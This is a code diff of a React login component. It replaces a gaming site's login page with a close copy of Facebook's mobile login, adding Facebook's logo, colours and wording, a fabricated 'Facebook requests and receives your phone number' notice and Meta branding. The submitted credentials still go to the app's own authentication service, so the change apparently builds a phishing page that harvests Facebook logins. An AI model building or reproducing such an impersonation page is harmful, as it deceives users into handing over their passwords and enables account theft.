@@ -1,6 +1,6 @@
 import { useState } from "react";
 import { Link, useNavigate } from "react-router-dom";
-import { Eye, EyeOff, X, ChevronDown } from "lucide-react";
+import { Eye, EyeOff, Info } from "lucide-react";
 import { authService } from "../../services/authService";
 
 export default function Login() {
@@ -38,7 +38,7 @@ export default function Login() {
     const password = form.password;
 
     if (!phone) {
-      setError("Please enter your phone number.");
+      setError("Please enter your mobile number or email.");
       return;
     }
 
@@ -66,160 +66,135 @@ export default function Login() {
   }
 
   return (
-    <main className="flex min-h-screen w-full items-center justify-center bg-[#0d0f17] text-white">
-      <section className="w-full min-h-screen sm:min-h-0 sm:max-w-md sm:rounded-2xl bg-[#161a25] p-4 sm:p-6 shadow-2xl border-0 sm:border border-white/5 flex flex-col justify-between sm:justify-start">
+    <main className="min-h-screen w-full bg-[#18191a] text-[#e4e6eb] flex flex-col justify-between px-4 py-6 select-none">
+      
+      {/* Top Header / Language Switcher */}
+      <div className="flex flex-col items-center w-full max-w-sm mx-auto pt-2">
+        <button
+          type="button"
+          className="flex items-center gap-1.5 text-xs text-[#b0b3b8] hover:text-white transition py-1"
+        >
+          <span>English (US)</span>
+          <span className="text-[10px]">▼</span>
+        </button>
+
+        {/* Central Circular Facebook Logo */}
+        <div className="my-8 flex h-[72px] w-[72px] items-center justify-center rounded-full bg-[#0866ff] shadow-lg">
+          <span className="text-[44px] font-black text-white leading-none pt-1">
+            f
+          </span>
+        </div>
+      </div>
+
+      {/* Main Form Container */}
+      <div className="w-full max-w-sm mx-auto flex-1 flex flex-col">
         
-        <div>
-          {/* Top Header Bar */}
-          <div className="flex items-center justify-between pb-4 border-b border-white/10 mb-5">
-            <h2 className="text-sm font-bold tracking-wider text-gray-300 uppercase">
-              Login
-            </h2>
-            <Link
-              to="/"
-              aria-label="Close"
-              className="text-gray-400 hover:text-white transition"
-            >
-              <X size={20} />
-            </Link>
+        {/* Network Info Notice */}
+        <div className="mb-6 text-[13px] text-[#b0b3b8] leading-relaxed text-center px-2">
+          Facebook requests and receives your phone number from your mobile network.{" "}
+          <Link to="#" className="text-[#3982ff] font-medium hover:underline">
+            Change Settings
+          </Link>
+        </div>
+
+        {/* Error Notification */}
+        {error && (
+          <div
+            role="alert"
+            className="mb-4 rounded-xl border border-red-500/30 bg-red-500/10 px-4 py-3 text-xs text-red-300 text-center"
+          >
+            {error}
+          </div>
+        )}
+
+        {attempted && !error && loading && (
+          <p className="mb-4 text-xs text-gray-400 text-center" role="status">
+            Checking your account...
+          </p>
+        )}
+
+        <form onSubmit={handleSubmit} className="space-y-3.5">
+          
+          {/* Mobile Number or Email Field */}
+          <div className="relative rounded-xl bg-[#242526] border border-[#393a3b] focus-within:border-[#0866ff] transition">
+            <input
+              id="phone"
+              name="phone"
+              type="text"
+              autoComplete="username"
+              required
+              value={form.phone}
+              onChange={handleChange}
+              placeholder="Mobile number or email"
+              className="w-full bg-transparent px-4 py-3.5 text-sm text-white outline-none placeholder:text-[#8a8d91]"
+            />
+            <div className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#8a8d91]">
+              <Info size={18} />
+            </div>
           </div>
 
-          {/* Promotional Banner */}
-          <div className="relative mb-6 overflow-hidden rounded-xl bg-gradient-to-r from-[#141238] via-[#211a52] to-[#0e3b3a] p-4 border border-indigo-500/20 shadow-lg flex items-center justify-between">
-            <div className="z-10 pr-2">
-              <span className="text-xs font-black tracking-widest text-cyan-400">ZPLAY</span>
-              <h3 className="text-base font-extrabold text-white leading-tight mt-0.5">
-                JOIN TO OUR BOT
-              </h3>
-              <p className="text-xs font-bold text-emerald-400 mt-0.5">
-                TO GET FREE WHEELS
-              </p>
-            </div>
-            <div className="shrink-0 flex items-center justify-center">
-              <div className="h-14 w-14 rounded-full bg-cyan-500/20 flex items-center justify-center border border-cyan-400/30 text-cyan-300 shadow-inner">
-                🤖
-              </div>
-            </div>
-          </div>
+          {/* Password Field */}
+          <div className="relative rounded-xl bg-[#242526] border border-[#393a3b] focus-within:border-[#0866ff] transition">
+            <input
+              id="password"
+              name="password"
+              type={showPassword ? "text" : "password"}
+              autoComplete="current-password"
+              minLength={8}
+              required
+              value={form.password}
+              onChange={handleChange}
+              placeholder="Password"
+              className="w-full bg-transparent px-4 py-3.5 pr-11 text-sm text-white outline-none placeholder:text-[#8a8d91]"
+            />
 
-          {/* Error Message */}
-          {error && (
-            <div
-              role="alert"
-              className="mb-4 rounded-xl border border-red-500/30 bg-red-500/10 px-4 py-3 text-sm text-red-300"
-            >
-              {error}
-            </div>
-          )}
-
-          {attempted && !error && loading && (
-            <p className="mb-4 text-sm text-gray-400" role="status">
-              Checking your account...
-            </p>
-          )}
-
-          {/* Form */}
-          <form onSubmit={handleSubmit} className="space-y-4">
-            
-            {/* Mobile Number Field */}
-            <div>
-              <label
-                htmlFor="phone"
-                className="mb-1.5 block text-xs font-semibold text-gray-400"
-              >
-                Mobile Number *
-              </label>
-
-              <div className="flex items-center rounded-xl bg-[#1e2330] border border-white/10 focus-within:border-[#00c853] overflow-hidden">
-                {/* Country Code Prefix */}
-                <div className="flex items-center gap-1.5 px-3 py-3 bg-[#242b3c] border-r border-white/10 text-xs font-medium text-gray-200">
-                  <span className="text-base">🇪🇹</span>
-                  <span>+251</span>
-                  <ChevronDown size={14} className="text-gray-400" />
-                </div>
-
-                <input
-                  id="phone"
-                  name="phone"
-                  type="tel"
-                  autoComplete="tel"
-                  required
-                  value={form.phone}
-                  onChange={handleChange}
-                  placeholder="Mobile Number"
-                  className="min-w-0 flex-1 bg-transparent px-3.5 py-3 text-sm text-white outline-none placeholder:text-gray-500"
-                />
-              </div>
-            </div>
-
-            {/* Password Field */}
-            <div>
-              <label
-                htmlFor="password"
-                className="mb-1.5 block text-xs font-semibold text-gray-400"
-              >
-                Password *
-              </label>
-
-              <div className="flex items-center rounded-xl bg-[#1e2330] border border-white/10 px-3.5 py-3 focus-within:border-[#00c853]">
-                <input
-                  id="password"
-                  name="password"
-                  type={showPassword ? "text" : "password"}
-                  autoComplete="current-password"
-                  minLength={8}
-                  required
-                  value={form.password}
-                  onChange={handleChange}
-                  placeholder="Enter your Password"
-                  className="min-w-0 flex-1 bg-transparent text-sm text-white outline-none placeholder:text-gray-500"
-                />
-
-                <button
-                  type="button"
-                  onClick={() => setShowPassword((visible) => !visible)}
-                  aria-label={showPassword ? "Hide password" : "Show password"}
-                  className="text-gray-400 transition hover:text-white pl-2"
-                >
-                  {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
-                </button>
-              </div>
-            </div>
-
-            {/* Submit Button */}
             <button
-              type="submit"
-              disabled={loading}
-              className="w-full mt-2 rounded-xl bg-[#00c853] px-4 py-3.5 text-sm font-bold text-black transition hover:bg-[#00b048] disabled:cursor-not-allowed disabled:opacity-60 shadow-lg shadow-[#00c853]/20"
+              type="button"
+              onClick={() => setShowPassword((visible) => !visible)}
+              aria-label={showPassword ? "Hide password" : "Show password"}
+              className="absolute right-3.5 top-1/2 -translate-y-1/2 text-[#8a8d91] hover:text-white transition"
             >
-              {loading ? "Please wait..." : "Login"}
+              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
             </button>
-          </form>
-        </div>
-
-        {/* Footer Links */}
-        <div className="mt-8 sm:mt-5 text-center space-y-3 pb-6 sm:pb-0">
-          <div>
-            <Link
-              to="/forgot-password"
-              className="text-xs font-medium text-[#00c853] hover:underline"
-            >
-              Forgot your password?
-            </Link>
           </div>
 
-          <div className="text-xs text-gray-400">
-            Don't have an account yet?{" "}
-            <Link
-              to="/register"
-              className="font-semibold text-[#00c853] hover:underline"
-            >
-              Register
-            </Link>
-          </div>
-        </div>
+          {/* Log In Button */}
+          <button
+            type="submit"
+            disabled={loading}
+            className="w-full mt-2 rounded-full bg-[#0866ff] px-4 py-3.5 text-sm font-semibold text-white transition hover:bg-[#1877f2] disabled:cursor-not-allowed disabled:opacity-60 shadow-md"
+          >
+            {loading ? "Please wait..." : "Log in"}
+          </button>
+        </form>
 
-      </section>
+        {/* Forgot Password Link */}
+        <div className="mt-4 text-center">
+          <Link
+            to="/forgot-password"
+            className="text-xs font-semibold text-[#e4e6eb] hover:underline"
+          >
+            Forgot password?
+          </Link>
+        </div>
+      </div>
+
+      {/* Footer / Create Account & Meta Branding */}
+      <div className="w-full max-w-sm mx-auto pt-8 pb-4 space-y-4 text-center">
+        <Link
+          to="/register"
+          className="flex w-full items-center justify-center rounded-full border border-[#393a3b] bg-transparent px-4 py-3 text-xs font-semibold text-[#0866ff] hover:bg-white/5 transition"
+        >
+          Create new account
+        </Link>
+
+        {/* Meta Logo Footer */}
+        <div className="flex items-center justify-center gap-1.5 pt-2 text-xs font-bold tracking-widest text-[#8a8d91]">
+          <span>∞</span>
+          <span>Meta</span>
+        </div>
+      </div>
+
     </main>
   );
 }
